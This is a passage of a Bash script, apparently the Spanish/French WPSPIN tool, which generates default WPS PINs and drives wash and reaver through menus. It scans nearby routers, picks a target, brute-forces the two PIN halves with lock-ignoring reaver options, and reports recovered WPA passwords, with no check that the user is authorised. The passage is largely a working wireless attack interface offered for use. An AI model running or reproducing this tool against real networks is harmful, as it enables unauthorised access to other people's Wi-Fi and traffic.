if [ "$WALSH_O_WASH" == "wash" ]; then                        # WE make a break here to be able to just display the results later and because it was confusing for langiages


echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco          BSSID        RSSI  WPS Abierto   PIN   Canal    ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

else

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco           BSSID                 PIN               ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

fi

for i in ${!BSSID[*]}; do
  
  CHANNEL_CHECK=$(echo ${CHANNEL[${i}]})
  LOCK_CHECK=$(echo ${LOCKED[${i}]})
  BSSID=$(echo ${BSSID[${i}]})
  ESSID=$(echo ${ESSID[${i}]})
  
  GENERATE
  if [ "$WALSH_O_WASH" == "wash" ]; then 
    if [ "$LOCK_CHECK" = "No" ]; then
     DISPLAY_LOCKED=$( echo -e "$verde Si$colorbae")
    else
     DISPLAY_LOCKED=$( echo -e "$rojo No$colorbae")  
    fi
  
    if [ "$CHANNEL_CHECK" -lt 10 ]; then
     DISPLY_CHANNEL=$( echo " $CHANNEL_CHECK")
    else
     DISPLY_CHANNEL=$(echo ${CHANNEL[${i}]})
    fi
  fi
   
  if [ "$UNKNOWN" = 1 ]; then
    DISPLAY_PIN=$( echo -e "$orange   $PIN$colorbase" )
  elif [ "$UNKNOWN" = 0 ]; then
    DISPLAY_PIN=$( echo -e "$verdefluo   $PIN$colorbase" ) 
  else
    DISPLAY_PIN=$( echo -e "$rojo NO SOPORTE$colorbase" )
  fi
  
  if [ "$i" -lt 10 ]; then
    NUM=$( echo -e " $amarillo$i$colorbase")
  else
    NUM=$( echo -e "$amarillo$i$colorbase")
  fi 


   if [ -n "${DEFAULTWPA}" ]; then
    DISPLAYBSSID=$( echo -e "$azulfluo$BSSID$colorbase")
  else
    DISPLAYBSSID=$( echo -e "$blanco$BSSID$colorbase")
  fi
 

  if [ "$WALSH_O_WASH" == "wash" ]; then
    echo -e " $NUM   $DISPLAYBSSID   ${RSSI[${i}]}  ${WPS[${i}]}   $DISPLAY_LOCKED$DISPLAY_PIN  $DISPLY_CHANNEL  $blanco$ESSID$colorbase"
  else
   echo -e " $NUM    $DISPLAYBSSID      $DISPLAY_PIN        $blanco$ESSID$colorbase  " 
  fi

done

echo -e "$colorbase"
echo "--------------------------------------------------------------------------------"
echo ""


CONFORMITY=$(echo ${#BSSID[@]})

if [ "$CONFORMITY" = 0 ]; then

  echo -e  "$rojo ERROR -$blanco Ningunos objetivos encontrados vamos a ver si wash tiene acceso a $amarillo$MON_ATTACK$colorbase "

    if [[ ! `(timeout 4 wash -i $MON_ATTACK -C | grep ERROR )` ]]; 
      then 
echo "--------------------------------------------------------------------------------"
    echo -e "$verdefluo                            wash tiene acceso a $amarillo$MON_ATTACK$colorbase"
echo "--------------------------------------------------------------------------------"

echo -e "$blanco 
 - A lo mejor los puntos de acceso cercanos$rojo no tienen WPS$blanco... 
 - A lo mejor no ha elegido $verdefluo la mejor interfaz$blanco...
 - Desconecta $amarillo todos os dispositivos$blanco
 - Compruebe $amarillo los permisos$blanco 
 - Comprueba$amarillo el punto de montaje$blanco si tiene WPSPIN en un$amarillo USB$blanco o$amarillo disco externo$blanco 
(Especialmente en modo live)
 -$kindofviolet Pronto se implementara Iw scan mode como alternativa a wash$blanco. 
 -$rojo De vuelta al menú de selección de interfaz, 
$blanco(si dispone de varios chipset compatibles se le pedirá elegir entre ellos)$blanco
... Si sigue saliendo este mensaje;
   ... compruebe su instalación de wash/reaver
$verdefluo  Podéis obtener soporte en$amarillo lampiweb.com$verdefluo and$amarillo crack-wifi.com$verdefluo
and soon in$amarillo Kali linux forum$colorbase"
  sleep 5
  airmon-ng stop $MON_ATTACK &>/dev/null
  unset MON_ATTACK
  IFACE
  BIG_MENUE                      
  else
echo "--------------------------------------------------------------------------------"
    echo -e "$rojo                    wash no tiene acceso a la interfaz$amarillo $MON_ATTACK$colorbase"
echo "--------------------------------------------------------------------------------"
echo -e "$blanco
 - Compruebe su$amarillo instalación de wash y reaver$blanco
 - Comprueba el$amarillo botón de encendido y apagado del wireless$blanco
 - Compruebe sus$amarillo puertos USB$blanco

$blanco Redirigiendo-le hacía la$kindofviolet selección de interfaz$blanco 
          ...mientras intentamos$verdefluo arreglar el fallo$colorbase 
$blanco (si dispone de varias interfaces se le pedirá elegir entre ellas)$colorbase"
  sleep 5
    
  if [[ -n `(airmon-ng stop $MON_ATTACK | grep SIOCSIFFLAGS )` ]]; &>/dev/null
    then
echo "--------------------------------------------------------------------------------"
echo -e " $rojo                      RF-Kill esta bloqueando el dispositivo 

$verdefluo     Verifique que su wireless sea activado y verifique su botón wireless $colorbase"
echo "--------------------------------------------------------------------------------"  
  sleep 5
  unset MON_ATTACK
  IFACE 
  BIG_MENUE
 fi
fi
  
  
   

     
  else  
 
TARGETNUMBER=$( echo -e "$colorbase Introducir el número del objetivo: $amarillo" )  
read  -ep "$TARGETNUMBER " i
echo -e "$colorbase"


  until [[ $i = *[[:digit:]]* ]] && [[ "$i" -lt "$CONFORMITY" ]]  &&  [[ "$i" -ge 1 ]]   ; do
    echo -e "     $magenta ¡OPCIÓN INVALIDA!  $colorbase"
    echo ""
    read  -ep "$TARGETNUMBER " i
    echo -e "$colorbase"
  done
fi

BSSID=$(echo ${BSSID[${i}]})
ESSIDSUCIO=$(echo ${ESSID[${i}]})
ESSID="${ESSIDSUCIO%"${ESSIDSUCIO##*[![:space:]]}"}"
CHANNEL=$(echo ${CHANNEL[${i}]})
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8

GENERATE

} 



BIG_MENUE_DISPLAY(){

echo -e "$colorbase copyleft GPL v.3, support the free software!" 
echo -e "
       .$amarillo'(     /$rojo·-.  $amarillo  )(.$rojo--.  $amarillo   /$rojo·-.  .$amarillo'(   )\  )\  $rojo
   ,') \  )  ,' _  \  (   ._.'  ,' _  \ \  ) (  \, / $colorbase     coded by$blanco kcdtv $rojo   
  (  /(/ /  (  '-' (   ·-. .   (  '-' ( ) (   ) \ (   $colorbase featuring  $blanco antares_145$rojo
   )    (    ) ,._.'  ,_ (  \   ) ,._.' \  ) ( ( \ \    $blanco r00tnull$colorbase -$blanco 1camaron1$rojo
  (  .'\ \  (  '     (  '.)  ) (  '      ) \  ·.)/  )    $blanco Coeman76$colorbase -$blanco Spawn$rojo  
$amarillo   )/   )/   )/   $rojo    '._,_.' $amarillo  )/        )/  $rojo   '$amarillo.( $colorbase  and the$blanco lampiweb team $colorbase"
echo ""
echo ""
echo -e "    $amarillo www.crack-wifi.com     www.lampiweb.com    www.auditoriaswireless.net$colorbase"

echo ""
echo ""
echo -e "                                                        "
echo -e " $magenta      _   ''   $rojo  _ () _      $amarillo                _ _ _                       
 $magenta     [|)efault$rojo  ||)[][|\|$magenta  generator  with$amarillo   \\/\/||)S $magenta attack  interface
   $rojo              L|          $amarillo                     L|  $magenta  ''                   "
echo ""

echo -e "$rojo
                          _ _    _       _        || 
                         //\/\ E[|\|ue  ||)rincipaL_]  '' 
                                        L|    $colorbase" 
echo "
"


echo -e "                +----------------------------------------------+  "
echo -e "                |                                              |  "
echo -e "                |  $amarillo   1$colorbase  -$blanco  MODO GUIADO (WASH Y REAVER)$colorbase        |  "
echo -e "                |  $amarillo   2$colorbase  -$blanco  PIN GENERADOR (CON MENU DE ATAQUE)$colorbase |  "
echo -e "                |  $amarillo   3$colorbase  -$blanco  CAMBIAR INTERFAZ$colorbase                   |  "
echo -e "                |  $amarillo   4$colorbase  -$blanco  REINICIAR O CAMBIAR IDIOMA$colorbase         |  "
echo -e "                |  $amarillo   5$colorbase  -$blanco  SALIR$colorbase                              |  "
echo -e "                |                                              |  "
echo -e "                +----------------------------------------------+  "
echo ""
echo ""
echo -e "                               Su elección : $rojo" 
echo ""
read -ep "                                      " BIG_MENUE_CHOICE
echo -e "$colorbase"

until [[ $BIG_MENUE_CHOICE = *[[:digit:]]* ]]  &&  [[ "$BIG_MENUE_CHOICE" -gt "0" ]]  && [[ "$BIG_MENUE_CHOICE" -lt "6" ]] ; do
  BIG_MENUE_DISPLAY
done

}




CIAO(){

echo -e "$colorbase"
echo -e "                       Saludos, nos vemos en$amarillo lampiweb.com$colorbase "
echo -e "           $rojo                  #      $amarillo crack-wifi.com$colorbase  y$amarillo auditoriaswireless.net$colorbase"
echo -e "                     $rojo       / \  $colorbase    "
echo -e "                        - $blanco (O o) $colorbase -         "           
echo -e "----------------------$blanco ooO--(_)-$blanco Ooo$colorbase--------------------------------------------"
exit 0

}








ATTACK_MENUE_DISPLAY(){
echo -e "                  "
echo -e "              Objetivo > $blanco$ESSID $colorbase mac > $blanco$BSSID $colorbase"
echo -e "              +----------------------------------------------------+  "
echo -e "              |$blanco   1 $colorbase -$amarillo ATACAR OBJETIVO CON EL PIN $rojo$PIN$colorbase         |  "
echo -e "              |$blanco   2 $colorbase -$amarillo ENTRAR OTRO PIN                    $colorbase         |  "
echo -e "              |$blanco   3 $colorbase -$amarillo ELEGIR UN RANGO DE PIN$colorbase                      |  "
echo -e "              |$blanco   4 $colorbase -$amarillo PERSONALIZAR EL ATTAQUE CON REAVER $colorbase         |  "
echo -e "              |$blanco   5 $colorbase -$verdefluo ELEGIR OTRO OBJETIVO $colorbase                       |  "
echo -e "              |$blanco   6 $colorbase <$azulfluo VOLVER$blanco /$amarillo CAMBIAR INTERFAZ$colorbase +$amarillo NUEVO ESCANEO$colorbase   |  "
echo -e "              |$blanco   7 $colorbase -$azulfluo REINICIAR$blanco /$azulfluo CAMBIAR IDIOMA$colorbase                  |  "
echo -e "              |$blanco   8 $colorbase -$rojo SALIR $colorbase                                      |  " 
echo -e "              +----------------------------------------------------+  "
echo ""
echo ""
echo -e "                               Su elección : $rojo" 
echo ""
read -ep "                                      " ATTACK_MENUE_CHOICE
echo -e " $colorbase"
until [[ $ATTACK_MENUE_CHOICE = *[[:digit:]]* ]] && [[ "$ATTACK_MENUE_CHOICE" -lt "9" ]]  &&  [[ "$ATTACK_MENUE_CHOICE" -gt "0" ]]; do  2> /dev/null
  ATTACK_MENUE_DISPLAY
done

}


CUSTOMPIN()                     # This function is used to allow the user to manually enter a PIN to be tried first 
{                               # option 2 in the attack menue

unset SELECTEDPIN 2> /dev/null  # we delete the former selected PIN if it remained set

echo ""
echo -e "         Entra los$amarillo 7 primeros dígitos$colorbase del$amarillo PIN$colorbase que quiere probar primero 
                       (No se necesita el checksum)
$verdefluo "
read -ep "                                " SELECTEDPIN 
echo -e "$colorbase" 
while !(echo $SELECTEDPIN | egrep -q "^([0-9]{7})$")
  do
    echo -e "           $rojo              ERROR: TIENE QUE ENTRAR 7 NUMEROS $colorbase"
    CUSTOMPIN
done
}


SECATOR()                   # This function let the user choose for a sequence of PIN to try first, we determine 4 values, 2 4 digits strings
{                           # ( first half PIN ) and 2 3 digits strings ( second half )

unset INICIOSEQUENCEFIRST 2> /dev/null  #  We ensure that there is not former values stored
unset FINSEQUENCEFIRST 2> /dev/null     #

  if [[ "$HEAD3" = "0" ]]; then         # if the first half PIN hasn't been found yet we propose to customize sequence on the first PIN
    echo "+------------------------------------------------------------------------------+"
    echo -e "|        $azullight            1* SECUENCIA PARA LA$verdefluo PRIMERA MITAD DE PIN $colorbase                |"
    echo "+------------------------------------------------------------------------------+" 
    ASKSSTARTSEQUENCE=$( echo -e "$colorbase Entra los cuatros números$blanco al inicio de la secuencia $verdefluo ")
    
    read -ep "$ASKSSTARTSEQUENCE" INICIOSEQUENCEFIRST
while !(echo $INICIOSEQUENCEFIRST | egrep -q "^([0-9]{4})$")
           do
            echo ""
            echo -e "                       $rojo    ERROR: DEBE ENTRAR 4 NUMEROS $colorbase "
            echo "" 
             read -ep "$ASKSSTARTSEQUENCE" INICIOSEQUENCEFIRST
done
    
    ASKENDSEQUENCE=$( echo -e "$colorbase Entra los cuatro números$blanco al final de la secuencia$rojo ")
    
    read -ep "$ASKENDSEQUENCE" FINSEQUENCEFIRST                                                                      
   
    
          while !(echo $FINSEQUENCEFIRST | egrep -q "^([0-9]{4})$")
           do
            echo ""
            echo -e "                       $rojo    ERROR: DEBE ENTRAR 4 NUMEROS $colorbase "
            echo ""   
                read -e -p "$ASKENDSEQUENCE" FINSEQUENCEFIRST                                                               
         done 

  fi

unset INICIOSEQUENCESECOND 2> /dev/null  #  We ensure that there is not former values stored
unset FINSEQUENCESECOND 2> /dev/null

    echo -e "$colorbase+------------------------------------------------------------------------------+"
    echo -e "|       $azullight             2* SECUENCIA PARA LA$rojo SEGUNDA MITAD DE PIN$colorbase                 |"
    echo -e "+------------------------------------------------------------------------------+"
    echo -e "|        $amarillo no poner el checksum ( ultimo dígito )$blanco - $rojo X para salir$colorbase               |"
    ASKSSTARTSEQUENCE2=$( echo -e "$colorbase Entra los tres números$blanco al inicio de la secuencia$verdefluo ")
    read -ep "$ASKSSTARTSEQUENCE2" INICIOSEQUENCESECOND     

    

      while !(echo $INICIOSEQUENCESECOND | egrep -q "^([0-9]{3})$") 
        do 
            if [[ "$INICIOSEQUENCESECOND" == "X" || "$INICIOSEQUENCESECOND" == "x" ]] ; then
   
              break
            fi
          echo ""
          echo -e "                   $rojo ERROR: DEBE ENTRAR 3 NUMEROS ( X PARA SALIR ) $colorbase "
          echo ""
          read -ep "$ASKSSTARTSEQUENCE2" INICIOSEQUENCESECOND
      done


    ASKENDSEQUENCE2=$( echo -e "$colorbase Entra los 3 números$blanco al final de la seceuncia$rojo ")

    read -ep "$ASKENDSEQUENCE2" FINSEQUENCESECOND

    while !(echo $FINSEQUENCESECOND | egrep -q "^([0-9]{3})$")  
      do 
         if [[ "$FINSEQUENCESECOND" == "X" || "$FINSEQUENCESECOND" == "x" ]]; then
           break
         fi
          echo ""
          echo -e "                   $rojo ERROR: DEBE ENTRAR 3 NUMEROS ( X PARA SALIR ) $colorbase "
          echo ""
          read -ep "$ASKENDSEQUENCE2" FINSEQUENCESECOND
  
    done
echo -e "$colorbase+------------------------------------------------------------------------------+"
}
 
 


SUMUPNOM6()
{
PINECRAN=$( printf '%04d\n' $HEAD1 )
PINLEFT=`expr 11000 '-' $HEAD1`
PINLEFTECRAN=$( printf '%05d\n' $PINLEFT ) 
PORCENT1=`expr $HEAD1 '*' 100 '/' 11`

PORCENT2=$( printf '%05d\n' $PORCENT1 )

INICIOPORCENT=$( echo "$PORCENT2" | cut -b -2 )

ENDPORCENT=$( echo "$PORCENT2" | cut -b 3- ) 
 
echo " +--------------------------------------+"
echo -e " |   $amarillo             RESUMEN       $colorbase        | "    ####################"TESTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
echo " +--------------------------------------+"
echo -e " |      Atacando la$rojo primera$colorbase mitad       | "
echo -e " |  Primeras mitades comprobadas - $amarillo$PINECRAN$colorbase |"    
echo -e " |    Quedan un máximo de $amarillo $PINLEFTECRAN$colorbase PIN    |"
echo " +--------------------------------------+"
echo -e " | $rojo$INICIOPORCENT$colorbase,$rojo$ENDPORCENT$colorbase% del ataque ha sido realizado |"
echo " +--------------------------------------+"  
echo ""


}



SUMUPM6()
{
 
PINECRAN=$( printf '%04d\n' $HEAD1 )
PINECRAN2=$( printf '%03d\n' $HEAD2 )
PINLEFT=`expr 1000 '-' $HEAD2`
PINLEFTECRAN=$( printf '%03d\n' $PINLEFT ) 
PORCENT1=`expr '(' $HEAD2 '+' 10000 ')' '*' 100 '/' 11`
PORCENT2=$( printf '%04d\n' $PORCENT1 )
INICIOPORCENT=$( echo "$PORCENT2" | cut -b -2 )
ENDPORCENT=$( echo "$PORCENT2" | cut -b 2- ) 
echo -e " $colorbase "  
echo "+------------------------------------------------------------------------------+"
echo -e "|   $amarillo                                 RESUMEN                           $colorbase        |"    ####################"TESTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
echo "+------------------------------------------------------------------------------+"
echo -e "|   $verdefluo PRIMERA MITAD PIN ENCONTRADA !$colorbase     |     Atacando la$rojo segunda $colorbase mitad       |" 
echo -e "|               $amarillo $PRIMERAMITAD$colorbase                   |  Segundas mitades comprobadas - $amarillo$PINECRAN2$colorbase  |"
echo -e "|Primeras mitades de PIN probadas - $verdefluo$PINECRAN$colorbase|     Quedan un máximo de$amarillo $PINLEFTECRAN$colorbase PIN      |"    

echo "+------------------------------------------------------------------------------+"
echo -e "|                     $rojo$INICIOPORCENT$colorbase,$rojo$ENDPORCENT$colorbase% del ataque ha sido efectuado                    |"
echo "+------------------------------------------------------------------------------+"  
echo -e "$colorbase"

}




PINFOUND(){

DATE=$(  date | cut -d "," -f 1 ) 
NEWNAME=${DATE// /_}
DISPLAYNEWNAME1=$( echo "$NEWNAME-$WPCNAME                                                            " | cut -b -70 )
DISPLAYNAME=$( echo "$DISPLAYNEWNAME1 $colorbase|") 
echo -e " $colorbase "  
echo "+------------------------------------------------------------------------------+"
echo -e "|          $verdefluo  SE OBTUVO EL PIN    !            $colorbase pin es $amarillo$PIN    $colorbase             |"
echo "+------------------------------------------------------------------------------+"
echo "|   la sesión *.wpc ha sido respalda en su carpeta WPSPIN bajo el nombre de   |"
echo -e "|       $azulfluo$DISPLAYNAME"
echo "+------------------------------------------------------------------------------+"

cat "$DIRECTORY/$WPCNAME" >> "$NEWNAME$WPCNAME"

rm -r "$DIRECTORY/$WPCNAME"

}



FAILEDREAVER()
{
echo "+------------------------------------------------------------------------------+"
echo -e "$rojo                                  ERROR $colorbase
+------------------------------------------------------------------------------+
$blanco                   Reaver no ha sido capaz de iniciar la interfaz$amarillo $MON_ATTACK$blanco
  
  - Compruebe el$amarillo botón wireless$blanco de su portátil
  - Compruebe sus $amarillo puertos y conexiones USB$blanco
  -$amarillo Desconectase$blanco de Internet 

... Lo enviamos en el menú de$kindofviolet selección de interfaz
$colorbase"
sleep 5 

rm attack.txt



if [[ -n `(airmon-ng stop $MON_ATTACK | grep SIOCSIFFLAGS )` ]]; &>/dev/null
    then
echo "--------------------------------------------------------------------------------"
echo -e " $rojo                      RF-Kill esta bloqueando el dispositivo 

$verdefluo    Verifique que su wireless sea activado y verifique su botón wireless $colorbase"
echo "--------------------------------------------------------------------------------"  
 sleep 5  
  
 fi

unset MON_ATTACK

IFACE
BIG_MENUE
}




FAKEM4WARNING()
{
echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "|                   $rojo       M4 SOSPECHOSO DETECTADO  $colorbase                           |"
echo "+------------------------------------------------------------------------------+"
echo -e "|$blanco A veces reaver procesa M4 que no han sido correctamente comprobados haciendo$colorbase |"
echo -e "|$blanco   que la llave no se recupere. Si esto sucede borrar $amarillo$WPCNAME$colorbase   |"
echo -e "|$blanco  y renombrar $amarillo BACKUPfakeM4_$WPCNAME$blanco como$verdefluo $WPCNAME$colorbase  |"
echo -e "|$blanco                  Volverá al primer$rojo M4 sospechoso$blanco detectado   $colorbase                |"
echo "+------------------------------------------------------------------------------+"
echo -e "$colorbase"
}


FAKEM6WARNING()
{
echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "|                   $rojo       M6 SOSPECHOSO DETECTADO  $colorbase                           |"
echo "+------------------------------------------------------------------------------+"
echo -e "|$blanco A veces reaver procesa M6 que no han sido correctamente comprobados haciendo$colorbase |"
echo -e "|$blanco   que la llave no se recupere. Si esto sucede borrar $amarillo$WPCNAME$colorbase   |"
echo -e "|$blanco  y renombrar $amarillo BACKUPfakeM6_$WPCNAME$blanco como$verdefluo $WPCNAME$colorbase  |"
echo -e "|$blanco                  Volverá al primer$rojo M6 sospechoso$blanco detectado   $colorbase                |"
echo "+------------------------------------------------------------------------------+"
echo -e "$colorbase"
}


CUSTOMREAVER()
{
echo -e "$colorbase+------------------------------------------------------------------------------+
|                  $violet          OPCIONES DISPONIBLES        $colorbase                      |
+------------------------------------------------------------------------------+
|$amarillo -e$colorbase --essid=<ssid>    $blanco          ESSID del objetivo        $colorbase                    |
|$amarillo -c$colorbase --channel=<channel>    $blanco     fijar el canal de nuestra interfaz        $colorbase    |
|                                $blanco   (se activa -f automaticamente)  $colorbase           |
|$amarillo -D$colorbase --daemonize   $blanco              Daemonize reaver         $colorbase                     |
|$amarillo -a$colorbase --auto       $blanco               Deja reaver buscar automáticamente los ajustes$colorbase|
|                                     $blanco       para el objetivo$colorbase                  |
|$amarillo -f$colorbase --fixed       $blanco              Desactiva el salto de canales     $colorbase            |
|$amarillo -5$colorbase --5ghz          $blanco            Usa la banda 5GHz (A)        $colorbase                 |
|$amarillo -d$colorbase --delay=<seconds>  $blanco         rato entre intentos de PIN ( por defecto [1]) $colorbase|
|$amarillo -l$colorbase --lock-delay=<seconds> $blanco     Definir un tiempo de espera antes de volver a $colorbase|
|         $blanco atacar cuando el routeur bloquea el WPS ( por defecto [60] )  $colorbase      |
|$amarillo -g$colorbase --max-attempts=<num>    $blanco    Parar después de cierto numero de PIN$colorbase         |
|$amarillo -x$colorbase --fail-wait=<seconds>   $blanco    Definir una pausa después de 1O intentos    $colorbase  |
|                                   $blanco fallidos ( valor por defecto [0] ) $colorbase       |
|$amarillo -r$colorbase --recurring-delay=<x:y>   $blanco  Pausar durante y segundos cada x intentos $colorbase    |
|$amarillo -t$colorbase --timeout=<seconds>       $blanco  Modificar el time out ([5] por defecto)   $colorbase    |
|$amarillo -T$colorbase --m57-timeout=<seconds>  $blanco   Definir el timeout entre M5/M7 [0.20] $colorbase        |
|$amarillo -A$colorbase --no-associate       $blanco       Reaver no se asocia con el AP      $colorbase           |
|                     $blanco (la asociación se tiene que hacer con otra herramienta)$colorbase |
|$amarillo -N$colorbase --no-nacks       $blanco           No se manda NACK cuando se reciben paquetes$colorbase   |
|                  $blanco comunicando que el protocolo quedo fuera de servicio   $colorbase    |
|$amarillo -S$colorbase --dh-small      $blanco            emplear pequeñas llaves DH para acelerar crack$colorbase|
|$amarillo -L$colorbase --ignore-locks      $blanco        Ignorar el estado de bloqueo cuando aparece$colorbase   |
|$amarillo -E$colorbase --eap-terminate     $blanco        Acabar cada transacción de PIN con    $colorbase        |
|                                   $blanco      un paquete EAP-FAIL         $colorbase         |
|$amarillo -n$colorbase --nack           $blanco           El objetivo siempre manda un NACK [Automatico]$colorbase|
|$amarillo -w$colorbase --win7          $blanco            Imitar windows 7 [No activado]   $colorbase             |
+------------------------------------------------------------------------------+
Los argumentos en rojo son mandatorios ($rojo reaver -i $MON_ATTACK -b $BSSID$colorbase )
Completa la linea mas abajo$colorbase. Añadir $amarillo -c $CHANNEL$colorbase para fijar el canal del objetivo
Y añadir $amarillo-vv $colorbase para obtener la información detallada sobre el ataque
Buena suerte :) $amarillo 
" 
MANDATORY=$( echo -e "$rojo reaver -i $MON_ATTACK -b $BSSID$verdefluo") 
read -e -p " $MANDATORY " REAVERCOMMAND
echo -e "$colorbase"
 
until [ -z `echo $REAVERCOMMAND | tr vecDaf1234567890dlgxrtTANSLEnw - | tr -d "-" | tr -d ' '` ] ;
do
 echo -e "$rojo error,$blanco opción incorrecta, consulte la lista mas arriba"
 echo "entrar los argumentos deseados o dejar en blanco y darle a enter
"
 read -e -p " $MANDATORY " REAVERCOMMAND
 echo -e "$colorbase"
done
echo -e "$blanco ataque personalizado guardado; $colorbase
Podéis atacar ahora mismo ($blanco 1 $colorbase) con el PIN indicado  
Podéis tambien entrar otro PIN ($blanco 2$colorbase ) o definir una secuencia entera de PIN ($blanco 3 $colorbase)

"

}



MON_ADVERTENCIA=$( echo -e "                                        
                 $rojo             ¡ADVERTENCIA! 
$colorbase
$rojo   El único chipset hallado por el sistema es desconocido por airmon-ng
               es probable que escaneo y ataque no funcionen :(  
$colorbase
" )                                                                # warning the user if his chipset is not fully recognized by airmon-ng





INTERFACEDESIGN=$( echo -e "$colorbase
   NUMERO     INTERFAZ       CHIPSET Y CONTROLADOR
              ---------------------------------------------------   
$blanco")                                                               # up part of the interface selection menue   



WASHWAIT=$(echo "+------------------------------------------------------------------------------+" 
        echo -e "|                $verdefluo         EFECTUANDO EL SCAN CON WASH$colorbase                          |
+------------------------------------------------------------------------------+
|$blanco El$amarillo PIN$blanco se muestra :            $colorbase                                              |
|                                                                              |
|$blanco  - En$verdefluo verde$blanco cuando el dispositivo esta soportado$colorbase                             |
|$blanco  - En$orange naranja$blanco cuando se trata de un dispositivo desconocido$colorbase                  |
|$blanco  - En$rojo rojo$blanco y sin valor numérico cuando el dispositivo no tiene soporte $colorbase      |
|                                                                              |
|$azulfluo Si el BSSID sale en azul$blanco : se genera y enseña la llave WPA por defecto $colorbase      |
|             $blanco    cuando se selecciona dicho BSSID    $colorbase                         |
|                                                                              |
+------------------------------------------------------------------------------+
|         $magenta       CERRAR LA VENTANA DE SCAN PARA LA FASE SIGUIENTE$colorbase              |
+------------------------------------------------------------------------------+")






NO_MONITOR_MODE=$(echo -e "$rojo              ¡ADVERTENCIA!$colorbase :$amarillo ¡ NO INTERFAZ COMPATIBLE DETECTADA ¡ $colorbase 

$rojo     WPSPIN se ejecutará solo en modo generador (sin escaneo, sin ataque)$colorbase
$rojo          puede redetectar las interfaces con el opción redetectar$colorbase ") 



NO_REAVER=$(echo -e "$rojo        ADVERTENCIA$colorbase :$amarillo ¡ NO SE DETECTO NINGUNA VERSIÓN DE WPS REAVER !  $colorbase 
$blanco      WPSPIN se ejecutará solo en modo generador (sin escaneo, sin ataque)$colorbase
$blanco      Instalar wps reaver para disfrutar de todas las funciones de WPSPIN$colorbase")



FAILED=$(echo -e " 
                       +------------------------------------+
                       |    $blanco      Ataque fallido    $colorbase        |
                       +------------------------------------+ 
                       |  $rojo¡NO SE OBTUVO LA CONTRASEÑA WPA!$colorbase  |  
                       +------------------------------------+
" )

KEY_FOUND=$(echo -e " 
                      +-------------------------------------+
                      |$verdefluo    ¡SE OBTUVO LA CONTRASEÑA WPA! $colorbase   |
                      +-------------------------------------+
             Resultados guardados en su carpeta WPSPIN en el fichero $colorbase "
 )




STOP_REAVER=$(echo -e " $rojo                   < CTRL + C > PARA PARRAR EL ATAQUE $colorbase "
 )





AIRMON_WARNING=$(echo -e "
 $rojo                     ¡ADVERTENCIA!$amarillo CHIPSET NO SOPORTADO!

$rojo           No se garantiza el buen funcionamiento de escaneo y ataque    
  Se recomienda elegir el opción 3 (cambiar interfaz) para cambiar de interfaz$colorbase "
 )



ROOT_ADVERTENCIA=$( echo -e "                                        
                 $rojo ¡ADVERTENCIA! $amarillo AUSENCIA DE PRIVILEGIOS ROOT
$colorbase
$rojo No tiene privilegios de administrador, WPSPIN no puede funcionar con normalidad
          Ejecute el script con sudo o inicie una consola como root$colorbase" 
)                                                                                              # warning display for non root user






DIRECTORY_ADVERTENCIA=$( echo -e "                                        
              $rojo       ¡ADVERTENCIA! $amarillo WPSPIN EN MODO REDUCIDO 
$colorbase
$rojo         Debe situarse en el directorio WPSPIN para lanzar el script
   Deje el script en su carpeta de origen sin cambiar el nombre de la carpeta 
                            use cd para ubicarse $colorbase" 
)                                                                                              # warning display for non WPSPIN directory




###################################################################################################################################
######################################################## 3 > FRANÇAIS (Else in the if language loop)


else





OUTPUT(){


echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "| $violet                      INFORMATION  SUR LE DISPOSITIF  $colorbase                       |"
echo "+------------------------------------------------------------------------------+"


if [ -n "${FABRICANTE}" ]; then
     DISPLAYFABRICANTE=$( echo "$FABRICANTE                                                              " | cut -b -61 )
   echo -e "| Fabricant    :$amarillo $DISPLAYFABRICANTE $colorbase|"
fi

if [ -n "${DEFAULTSSID}" ]; then
    DISPLAYDEFAULTSSID=$( echo "$DEFAULTSSID                                                              " | cut -b -61 )
   echo -e "| SSID défaut  :$amarillo $DISPLAYDEFAULTSSID $colorbase|"
fi

if [ -n "${MODEL}" ]; then
DISPLAYMODEL=$( echo "$MODEL                                                              " | cut -b -61 )
echo -e "| Modèle       :$amarillo $DISPLAYMODEL $colorbase|"
fi

 unset DISPLAYFABRICANTE && unset DISPLAYDEFAULTSSID && unset DISPLAYMODE




  if [ "$UNKNOWN" -eq "0"  ]; 
    then


     echo "+------------------------------------------------------------------------------+"
     echo -e "|   $violet                        INFORMATION SUR LE WPS        $colorbase                     |"
     echo "+------------------------------------------------------------------------------+"

       if [ "$ACTIVATED" -eq "1" ] ; 
        then
          echo -e "| $verdefluo                           WPS ACTIVE PAR DÉFAUT         $colorbase                    |" 
          echo "+------------------------------------------------------------------------------+"
       else
          echo -e "|        $rojo                  WPS NON ACTIVE PAR DÉFAUT       $colorbase                    |"
          echo "+------------------------------------------------------------------------------+"  
       fi

      if  [ "$APRATE" -eq "0" ] ;
        then
        echo -e "|        $verdefluo                    PAS DE BLOCAGE DU WPS          $colorbase                   |"  
        echo "+------------------------------------------------------------------------------+"
      else
        echo -e "|     $rojo              ATTENTION : SYSTÈME DE BLOCAGE DU WPS        $colorbase              |"
        echo "+------------------------------------------------------------------------------+"
      fi
 
      if  [ "$SPECIAL" -eq "1" ] ;
        then
        echo -e "|  $rojo  VÉRIFIEZ LE MODÈLE EXACT, PLUSIEURS MODÈLES PARTAGENT CE RANG DE BSSID  $colorbase  |"
        echo "+------------------------------------------------------------------------------+" 
      fi
  DISPLAYPIN=$( echo "$PIN $PIN1 $PIN2 $PIN3 $PIN4 $PIN5 $PIN6 $PIN7 $PIN8                                                                   " | cut -b -78 )        

echo "+------------------------------------------------------------------------------+"
echo -e "|       $violet                      PIN(s) par DÉFAUT     $colorbase                           |"     
echo -e "|$amarillo$DISPLAYPIN$colorbase|"
echo "+------------------------------------------------------------------------------+"
 elif [ "$UNKNOWN" -eq "1"  ]; then

    echo "+------------------------------------------------------------------------------+"
    echo -e "|         $rojo                    DISPOSITIF INCONNU           $colorbase                    |"
